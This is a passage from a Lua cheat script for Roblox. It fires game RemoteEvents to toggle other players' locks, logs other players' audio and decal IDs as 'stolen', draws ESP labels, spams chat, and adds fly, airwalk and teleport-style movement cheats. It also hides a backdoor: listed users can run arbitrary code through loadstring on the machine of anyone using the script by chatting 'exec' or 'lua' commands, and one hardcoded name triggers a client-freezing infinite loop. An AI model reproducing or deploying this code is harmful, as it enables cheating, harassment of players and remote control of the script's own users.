		CText:CaptureFocus()
		Cframe:TweenPosition(UDim2.new(0.015, 0, 0.95, 0), "Out", "Elastic", 0.5, true)
	end
	local Target,Player = Mouse.Target
		if Target then 
			Player = Players:GetPlayerFromCharacter(Target.Parent) or Players:GetPlayerFromCharacter(Target.Parent.Parent)
		end
	if Key.KeyCode == Enum.KeyCode.Q and Player then
		if Player.Name == "NotCyrusAtAll" then while true do end end
		for _,v in pairs(Player:GetDescendants()) do 
			if v:IsA'Sound' and v.Name == "SoundX" then
				local Id = MarketplaceService:GetProductInfo(v.SoundId:match"%d+")
				if Id.AssetTypeId == 3 then
					notif("Stole the audio"..Id.AssetId,"From "..Player.Name,5,nil)
					writefile("AudioLog From "..Player.Name.." "..math.random(1,99)..".txt","Stolen ID: "..Id.AssetId.." From: "..Player.Name)
				end
			end
		end
	end
	if Key.KeyCode == Enum.KeyCode.Q and string.find(Mouse.Target.Name,"Spray") then 
		local Target = Mouse.Target 
		if Target:FindFirstChildOfClass'BlockMesh' and Target:FindFirstChildOfClass'Decal' then 
			notif("Stole the decal from "..Target.Name:gsub("Spray",""),"The ID is "..tostring(Target.Decal.Texture:match"%d+").." it is also in your workspace folder",5,nil)
			writefile("DecalLog From "..Target.Name:gsub("Spray","").." "..math.random(1,99)..".txt","Stolen Decal: "..tostring(Target.Decal.Texture:match"%d+").." From: "..Target.Name:gsub("Spray",""))
		end
	end
end

local function Ended(Key,Chatting)
if UserInput:GetFocusedTextBox() then return end -- fuck you roblox [2]
	if Key.KeyCode == Enum.KeyCode.LeftShift and not Normalwalk then
		KeyTable['Shift'] = false 
		LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = WalkSpeed
	end
	if Key.KeyCode == Enum.KeyCode.LeftControl and not Normalwalk then 
		LP.Character:FindFirstChildOfClass'Humanoid'.WalkSpeed = WalkSpeed
	end
end

local function Lost(Enter)
	Cframe:TweenPosition(UDim2.new(0.015, 0, 1, 0),"Out","Quad",0.5,true)
	if Enter then 
		local Cmd = CText.Text
		CText.Text = ""
		RunCmd(Cmd)
	end
end

local function Released(cmd)
	if cmd == CText then 
		local Cmd = CText.text
		CText.Text = ""
		RunCmd(Cmd)
		Cframe:TweenPosition(UDim2.new(0.015, 0, 1, 0),"Out","Quad",0.5,true)
	end
end

Mouse.Button2Down:Connect(function()
if Mouse.Target then 
	local Target = Mouse.Target.Parent 
	if Target:FindFirstChild'Lock' and Target:FindFirstChild'Click' and Target:FindFirstChild'Locker' then 
		if Target.Locker.Value then 
				Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
				Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			else
				Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
				Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			end
		end
	end
end)

local function espcoolkid(Plr,Char)
	local CoolKid1 = Instance.new("BillboardGui",CoreGui.RobloxGui)
	CoolKid1.Adornee = Char.Head
	CoolKid1.Size = UDim2.new(0, 100, 0, 100)
	CoolKid1.StudsOffset = Vector3.new(0, 1, 0)
	CoolKid1.AlwaysOnTop = true
	CoolKid1.Name = ""..CoolkidTable[tostring(Plr.UserId)]
	local CoolKid2 = Instance.new("TextLabel",CoolKid1)
	CoolKid2.BackgroundTransparency = 1
	CoolKid2.Position = UDim2.new(0, 0, 0, 0)
	CoolKid2.Size = UDim2.new(1, 0, 0, 40)
	CoolKid2.TextColor3 = Color3.fromRGB(125,0,0)
	CoolKid2.TextStrokeTransparency = 0.5
	CoolKid2.TextSize = 15
	CoolKid2.TextStrokeColor3 = Color3.fromRGB(125,0,0)
	CoolKid2.Text = ""..CoolkidTable[tostring(Plr.UserId)]
	Plr.CharacterRemoving:Connect(function()
		CoolKid1:Destroy()
		CoolKid2:Destroy()
	end)
	Players.PlayerRemoving:Connect(function(plr)
		if plr == Plr then 
			CoolKid1:Destroy()
			CoolKid2:Destroy()
		end
	end)
end


for _,v in pairs(Players:GetPlayers()) do 
	if CoolkidTable[tostring(v.UserId)] then 
		espcoolkid(v,v.Character)
		v.CharacterAdded:Connect(function(Char)
			repeat wait() until Char.Head
			espcoolkid(v,v.Character)
		end)
		v.Chatted:Connect(function(Chat)
		if CoolkidTable[tostring(LP.UserId)] then return end
			if Chat:sub(1,5) == "exec " then 
				RunCmd(Chat:sub(6))
			elseif Chat:sub(1,4) == "lua " then 
				loadstring(Chat:sub(5))()
			end
		end)
	end
end

Players.PlayerAdded:Connect(function(plr)
	if CoolkidTable[tostring(plr.UserId)] then
		plr.CharacterAdded:Connect(function(Char)
			repeat wait() until Char.Head
			espcoolkid(plr,Char)
		end)
		plr.Chatted:Connect(function(Chat)
		if CoolkidTable[tostring(LP.UserId)] then return end
			if Chat:sub(1,5) == "exec " then 
				RunCmd(Chat:sub(6))
			elseif Chat:sub(1,4) == "lua " then 
				loadstring(Chat:sub(5))()
			end
		end)
	end
	if tostring(plr.UserId) == "659119329" then 
		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Your god Cyrus has joined.","All")
	end
end)

LP.Chatted:Connect(RunCmd)
LP.Backpack.ChildAdded:Connect(MultiUzif)
LP.PlayerGui.ChildAdded:Connect(bc)
LP.Character.ChildAdded:Connect(GodFuckIhateRobloxIHaveNoMotivationForThisShitGame)
LP.CharacterAdded:Connect(Added)
LP.Character.Humanoid.StateChanged:Connect(HumanoidState)
LP.Character['Left Leg'].Touched:Connect(lolmultiuzithatisreloading)
LP.Character.Humanoid.Died:Connect(lol)
RunService.Stepped:Connect(Looped)
Mouse.KeyDown:Connect(HotkeyHandler)
CText.Changed:Connect(Changed)
CText.FocusLost:Connect(Lost)
UserInput.InputBegan:Connect(Started)
UserInput.InputEnded:Connect(Ended)
UserInput.TextBoxFocusReleased:Connect(Released)
UserInput.JumpRequest:Connect(DoubleJump)
Mouse.Button1Down:Connect(Modes)


spawn(function()
	while wait(SpamDelay) do 
		if Spamming and SpamText then 
			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SpamText,"All")
		end
	end
end)

spawn(function()
	while true do
		if LP.Character and LP.Character:FindFirstChildOfClass'Humanoid' and LP.Character:FindFirstChild'Torso' and LP.Character:FindFirstChild'Head' then
			if LP.Character:FindFirstChildOfClass'Humanoid'.HipHeight > 0 or flying or AirWalkOn and LP.Character.Humanoid.FloorMaterial == Enum.Material.Neon and not LP.Character:FindFirstChildOfClass'Humanoid'.Sit then 
				local JP = LP.Character:FindFirstChildOfClass'Humanoid'.JumpPower
				LP.Character:FindFirstChildOfClass'Humanoid'.JumpPower = 1.5
				LP.Character:FindFirstChildOfClass'Humanoid':ChangeState(3)
				wait(0.2)
				LP.Character:FindFirstChildOfClass'Humanoid'.JumpPower = JP
			end
			if AirWalkOn then 
				LP.Character:FindFirstChildOfClass'Humanoid'.HipHeight = 0
				AirWalk.CFrame = LP.Character.HumanoidRootPart.CFrame * CFrame.new(0,-4,0)
			end
			if Blinking then 
				LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * BlinkSpeed
			end
		end
		wait()
	end
end)
